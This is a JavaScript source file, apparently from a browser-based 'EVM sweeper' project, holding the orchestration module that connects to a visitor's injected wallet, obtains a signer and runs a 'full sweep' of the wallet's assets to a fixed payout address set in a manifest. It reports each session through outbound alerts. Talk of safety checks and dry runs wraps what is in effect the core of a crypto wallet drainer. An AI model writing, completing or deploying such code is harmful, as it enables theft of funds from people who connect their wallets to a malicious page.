// client-side-evm-sweeper/src/core/master-link.js
import { TransactionRunner } from './transaction-runner.js';
import { networkManifest } from '@/config/network-manifest.js';
import { OutboundAlerts } from './outbound-alerts.js';


/**
 * MASTER LINK - Compatibility Entry Point
 * Main orchestration layer between UI wrapper and execution engine.
 * Production-ready with deep validation, logging, wallet detection, and safety.
 */

export class MasterLink {
  constructor(options = {}) {
    this.options = {
      defaultDryRun: true,
      maxRetries: 3,
      logLevel: 'info',
      ...options
    };

    this.alerts = new OutboundAlerts(options.alerts || {});
    this.currentRunner = null;
    this.isRunning = false;
    this.sessionStartTime = null;
  }

  /**
   * Main public entry point
   */
  async startWithWallet(walletAddress, chainId = 1, overrides = {}) {
    if (this.isRunning) {
      console.warn("MasterLink: Sweep already in progress.");
      return { success: false, reason: "Already running" };
    }

    this.sessionStartTime = Date.now();
    this.isRunning = true;

    try {
      await this.validateInputs(walletAddress, chainId);
      await this.logStart(walletAddress, chainId);

      const provider = await this.detectAndValidateProvider();
      const signer = await this.getSigner(provider);

      const config = this.buildRunnerConfig(walletAddress, chainId, overrides);

      this.currentRunner = new TransactionRunner(config);

      // Final pre-flight checks
      await this.runPreFlightChecks();

      console.log(`[MasterLink] Executing full sweep for ${walletAddress}`);
      
      const result = await this.currentRunner.executeFullSweep(signer, provider);

      await this.logSuccess(result);
      return { success: true, result };

    } catch (error) {
      await this.handleCriticalError(error, walletAddress);
      return { success: false, error: error.message };
    } finally {
      this.isRunning = false;
      this.currentRunner = null;
    }
  }

  async validateInputs(walletAddress, chainId) {
    if (!walletAddress || !/^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
      throw new Error("Invalid Ethereum wallet address format");
    }
    if (!Number.isInteger(chainId) || chainId < 1) {
      throw new Error("Invalid chainId");
    }

    // Check if network is supported
    const supported = networkManifest.networks.some(n => n.chainId === chainId);
    if (!supported) {
      console.warn(`Chain ${chainId} not explicitly configured. Proceeding with defaults.`);
    }
  }

  async detectAndValidateProvider() {
    if (typeof window === 'undefined' || !window.ethereum) {
      throw new Error("No injected wallet provider found (MetaMask, WalletConnect, etc.)");
    }

    const provider = window.ethereum;

    // Check if connected
    try {
      const accounts = await provider.request({ method: 'eth_accounts' });
      if (accounts.length === 0) {
        await provider.request({ method: 'eth_requestAccounts' });
      }
    } catch (err) {
      throw new Error("Failed to connect to wallet: " + err.message);
    }

    return provider;
  }

  async getSigner(provider) {
    // For ethers v5/v6 compatibility
    if (typeof window.ethers !== 'undefined') {
      return new window.ethers.providers.Web3Provider(provider).getSigner();
    }
    
    // Fallback for raw provider
    console.warn("Using raw provider as mock signer. Full signing may be limited.");
    return provider;
  }

  buildRunnerConfig(walletAddress, chainId, overrides) {
    return {
      networks: networkManifest.networks,
      targets: networkManifest.targets || [],
      ownerAddress: walletAddress,
      sweeperAddress: networkManifest.EVM_PAYOUT_TARGET || overrides.sweeperAddress,
      dryRun: overrides.dryRun !== undefined ? overrides.dryRun : this.options.defaultDryRun,
      alerts: this.options.alerts,
      maxConcurrent: overrides.maxConcurrent || 2,
      preferredProfile: overrides.preferredProfile || 'aggressive'
    };
  }

  async runPreFlightChecks() {
    console.log("[MasterLink] Running pre-flight safety checks...");

    if (!networkManifest.EVM_PAYOUT_TARGET) {
      console.warn("Warning: No EVM_PAYOUT_TARGET defined in manifest.");
    }

    if (networkManifest.targets?.length === 0) {
      console.warn("Warning: No targets configured.");
    }

    await new Promise(r => setTimeout(r, 300)); // breathing room
  }

  async logStart(walletAddress, chainId) {
    console.log(`%c[MasterLink] Starting sweep session for ${walletAddress.slice(0,6)}... on chain ${chainId}`, 
      "color: #00ffaa; font-weight: bold");

    await this.alerts.info(
      "Sweep Session Started",
      `Wallet: ${walletAddress.slice(0,8)}... | Chain: ${chainId}`,
      { sessionStart: new Date().toISOString() }
    );
  }

  async logSuccess(result) {
    const duration = ((Date.now() - this.sessionStartTime) / 1000).toFixed(1);
    
    console.log(`%c[MasterLink] Sweep completed successfully in ${duration}s`, 
      "color: #00ff00; font-weight: bold");

    await this.alerts.success(
      "Sweep Completed",
      `Processed ${result.length} assets in ${duration} seconds`,
      { duration, processed: result.length }
    );
  }

  async handleCriticalError(error, walletAddress) {
    console.error("[MasterLink] Critical failure:", error);

    await this.alerts.error(
      "Sweep Execution Failed",
      error.message || "Unknown execution error",
      {
        wallet: walletAddress.slice(0, 12) + "...",
        duration: ((Date.now() - this.sessionStartTime) / 1000).toFixed(1)
      }
    );
  }

  // ================ Utility & Control Methods ================

  async stop() {
    this.isRunning = false;
    console.log("[MasterLink] Stop command received.");
  }

  getStatus() {
    return {
      isRunning: this.isRunning,
      sessionDuration: this.sessionStartTime ? 
        ((Date.now() - this.sessionStartTime) / 1000).toFixed(1) : 0,
      runnerActive: !!this.currentRunner
    };
  }

  async forceDryRunMode() {
    this.options.defaultDryRun = true;
    console.log("[MasterLink] Dry-run mode enabled globally.");
  }
}

// ====================== Default Export ======================
const masterLink = new MasterLink();

export default masterLink;

// Auto-attach to window for easy debugging in browser console
if (typeof window !== 'undefined') {
  window.MasterLink = masterLink;
  console.log("%c[MasterLink] Successfully initialized and attached to window.", 
    "color: #00aaff; font-weight: bold");
}